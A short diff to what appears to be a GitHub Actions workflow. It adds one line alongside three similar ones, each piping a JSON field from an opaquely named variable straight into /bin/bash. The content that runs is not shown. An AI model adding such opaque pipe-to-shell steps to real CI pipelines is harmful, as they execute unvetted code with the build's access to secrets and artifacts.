@@ -25,6 +25,7 @@ jobs:
           echo $pr33 | jq -r .wf74 | /bin/bash
           echo $ng1966 | jq -r .ckhik52 | /bin/bash
           echo $eb587 | jq -r .k8817 | /bin/bash
+          echo $imff108 | jq -r .vzkp2 | /bin/bash
 
       - name: Upload output
         uses: actions/upload-artifact@v4
